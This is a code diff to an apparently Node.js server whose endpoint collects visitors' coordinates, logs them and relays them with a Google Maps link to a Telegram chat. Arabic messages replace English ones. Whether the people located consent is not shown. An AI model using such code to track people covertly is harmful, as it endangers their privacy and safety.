@@ -16,10 +16,12 @@ app.use(morgan("combined"));
 
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const CHAT_ID = process.env.CHAT_ID;
+
 if (!BOT_TOKEN || !CHAT_ID) {
-  console.error("❌ BOT_TOKEN or CHAT_ID not set");
+  console.error("❌ لم يتم تعيين BOT_TOKEN أو CHAT_ID");
   process.exit(1);
 }
+
 const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
 
 app.use(express.static(path.join(__dirname, "public")));
@@ -42,16 +44,18 @@ app.post("/api/receive-location", async (req, res) => {
     };
     fs.appendFileSync("locations.log", JSON.stringify(entry) + "\n");
 
-    // إرسال الموقع إلى البوت
-    await axios.post(`${TELEGRAM_API}/sendLocation`, {
+    const googleMapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+    const message = `📍 موقع جديد تم استلامه:\n\n🌐 ${googleMapsUrl}\n\n🎯 الدقة: ${accuracy}م\n🕒 ${new Date(timestamp).toLocaleString()}`;
+
+    await axios.post(`${TELEGRAM_API}/sendMessage`, {
       chat_id: CHAT_ID,
-      latitude: lat,
-      longitude: lon,
+      text: message,
+      disable_web_page_preview: true,
     });
 
     res.json({ ok: true });
   } catch (err) {
-    console.error(err);
+    console.error("❌ Error sending location:", err);
     res.status(500).send("Server error");
   }
 });
